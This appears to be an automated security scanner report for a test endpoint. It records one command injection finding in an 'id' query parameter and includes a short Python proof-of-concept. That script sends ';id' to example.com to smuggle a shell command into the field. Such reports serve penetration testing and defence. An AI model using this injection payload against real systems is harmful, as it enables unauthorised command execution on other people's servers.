# RedScan Report: /atomic-test

- generated_at: 2026-02-23T02:31:31
- phase: deep
- verified_count: 1

## [1] Command Injection
- vector: id/query
- tool: python_script
- reason: test
- evidence: uid=

### Exploit Code (`exploit_1.py`)

```python
import requests
r = requests.request('GET', 'http://example.com/search?id=%3Bid', headers={}, data=b'', timeout=10)
print(r.status_code)
print(r.text[:1000])
```
